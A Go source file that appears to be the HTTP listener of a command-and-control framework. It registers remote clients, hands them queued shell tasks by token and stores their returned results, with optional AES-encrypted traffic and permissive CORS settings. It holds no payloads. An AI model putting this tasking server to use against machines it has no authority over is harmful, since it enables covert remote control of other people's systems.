package listeners

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"strconv"
	"strings"

	"github.com/alireza-hmd/c2/clients"
	"github.com/alireza-hmd/c2/pkg/encrypt/aes"
	"github.com/alireza-hmd/c2/pkg/response"
	"github.com/alireza-hmd/c2/tasks"
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

func InitHandler(ls UseCase, cs clients.UseCase, ts tasks.UseCase, name string, port int, stop chan Cancel) {
	gin.DefaultWriter = io.Discard
	gin.SetMode(gin.ReleaseMode)
	app := gin.Default()
	app.Use(cors.New(cors.Config{
		AllowAllOrigins:  true,
		AllowMethods:     []string{"GET", "POST", "OPTIONS"},
		AllowCredentials: true,
	}))
	api := app.Group("/")
	Handle(api, ls, cs, ts)
	log.Printf("starting listener \"%s\" on port %d\n", name, port)

	err := app.Run(fmt.Sprintf(":%d", port))
	if err != nil {
		log.Printf("error starting server on port %d, err: %v", port, err)
		listener := &ListenerUptade{
			Connected: Disconnected,
			Active:    DeactiveStatus,
		}
		if err := ls.Update(name, listener); err != nil {
			log.Println("error updating listener when initializing handler")
			fmt.Println(err.Error())
		}
		return
	}

}

type handler struct {
	ls UseCase
	cs clients.UseCase
	ts tasks.UseCase
}

func (h *handler) Register(c *gin.Context) {
	var data clients.Register
	if err := c.ShouldBind(&data); err != nil {
		log.Println(err)
		response.ErrorResponse(c, 400, "bad request")
		return
	}
	if data.Listener == "" {
		response.ErrorResponse(c, 400, "listener is empty")
		return
	}
	l, err := h.ls.Get(data.Listener)
	if err != nil {
		if err == response.ErrNotFound {
			response.ErrorResponse(c, 400, "listener doesn't exists")
			return
		}
		response.ErrorResponse(c, 400, err.Error())
		return
	}
	if l.Active == DeactiveStatus {
		response.ErrorResponse(c, 400, "Listener is deactivated")
		return
	}
	if l.Connected == Connected {
		response.ErrorResponse(c, 400, "Listener is connected to another client")
		return
	}

	lUpdate := &ListenerUptade{
		Connected: Connected,
	}
	if err := h.ls.Update(data.Listener, lUpdate); err != nil {
		response.ErrorResponse(c, 400, err.Error())
		return
	}
	cli := clients.NewClient(data.Listener, data.RemoteIP, data.ClientType, data.SilentMode, data.Encrypted)
	id, err := h.cs.Create(cli)
	if err != nil {
		response.ErrorResponse(c, 400, err.Error())
		return
	}

	body := struct {
		Token          string `json:"token"`
		Timeout        int    `json:"timeout"`
		ConnectionType string `json:"connection_type"`
	}{
		Token:          cli.Token,
		Timeout:        cli.Timeout,
		ConnectionType: HTTPConnection,
	}
	fmt.Printf("\nclient #%d registered successfully\n", id)
	response.OkResponseWithData(c, "client registered successfully", body)

}

type Task struct {
	ID       int    `json:"id"`
	Client   string `json:"client"`
	Listener string `json:"listener"`
	Command  string `json:"command"`
}

func (h *handler) Tasks(c *gin.Context) {
	token := c.Param("token")
	if token == "" {
		response.ErrorResponse(c, 400, "token is empty")
		return
	}

	cli, err := h.cs.Get(token)
	if err != nil && err != response.ErrNotFound {
		response.ErrorResponse(c, 400, err.Error())
		return
	}
	tt, err := h.ts.ListToDoTasks(token)
	if err != nil && err != response.ErrNotFound {
		if cli.Encrypted {
			response.EncryptedErrorResponse(c, 400, err.Error(), cli.Token)
			return
		}
		response.ErrorResponse(c, 400, err.Error())
		return
	}
	taskList := []Task{}
	for _, t := range tt {
		task := Task{
			ID:       t.ID,
			Client:   t.Client,
			Listener: t.Listener,
			Command:  t.Command,
		}
		fmt.Printf("task #%d delivered to client %s\n", t.ID, t.Client)
		taskList = append(taskList, task)

		taskUpdate := &tasks.TaskUpdate{
			Status: tasks.Delivered,
		}
		if err := h.ts.Update(t.ID, taskUpdate); err != nil {
			log.Printf("error updating task #%d status\n", t.ID)
		}
	}
	if cli.Encrypted {
		response.EncryptedOkResponse(c, "successful request", cli.Token, taskList)
		return
	}
	response.OkResponse(c, "successfull request", taskList)
}

type ResultResponse struct {
	Message string   `json:"message"`
	Success bool     `json:"success"`
	Data    []Result `json:"data"`
}
type Result struct {
	TaskID  int    `json:"task_id"`
	Command string `json:"command"`
	Result  string `json:"result"`
	Success bool   `json:"success"`
}

func (h *handler) Results(c *gin.Context) {
	var res ResultResponse
	token := c.Param("token")
	if token == "" {
		response.ErrorResponse(c, 400, "token is empty")
		return
	}
	cli, err := h.cs.Get(token)
	if err != nil && err != response.ErrNotFound {
		response.ErrorResponse(c, 400, err.Error())
		return
	}
	if cli.Encrypted {
		var resStr string
		if err := c.ShouldBind(&resStr); err != nil {
			response.ErrorResponse(c, 400, "bad request")
			return
		}
		data := aes.StrToByte(resStr)
		key := aes.StrToByte(token)
		data, err = aes.Decrypt(data, key)
		if err != nil {
			response.ErrorResponse(c, 400, "bad request")
			return
		}
		if err := json.Unmarshal(data, &res); err != nil {
			response.ErrorResponse(c, 400, "error parsing json")
			return
		}
	} else {
		if err := c.ShouldBind(&res); err != nil {
			response.ErrorResponse(c, 400, "error parsing json")
			return
		}
	}
	for _, r := range res.Data {
		t, err := h.ts.Get(r.TaskID)
		if err != nil {
			fmt.Printf("error getting task #%d.\n", r.TaskID)
			continue
		}
		fmt.Printf("client %s delivered task #%d's result\n", t.Client, t.ID)
		task := &tasks.TaskUpdate{
			Result: r.Result,
		}

		if r.Success {
			task.Status = tasks.Done
			cmdParts := strings.Split(t.Command, " ")
			if cmdParts[0] == tasks.Timeout {
				timeout, _ := strconv.Atoi(cmdParts[1])
				client := &clients.ClientUpdate{
					Timeout: timeout,
				}
				if err := h.cs.Update(t.Client, client); err != nil {
					log.Println(err)
				}
			}
		} else {
			task.Status = tasks.Failed
		}
		if err := h.ts.Update(t.ID, task); err != nil {
			fmt.Printf("error updating task #%d results.\n", r.TaskID)
		}
	}
	response.OkResponse(c, "successful request", nil)
}

func Handle(r *gin.RouterGroup, ls UseCase, cs clients.UseCase, ts tasks.UseCase) {
	h := &handler{
		ls: ls,
		cs: cs,
		ts: ts,
	}
	api := r.Group("/clients")
	{
		api.POST("/register", h.Register)
		api.GET("/:token/tasks", h.Tasks)
		api.POST("/:token/results", h.Results)
	}
}
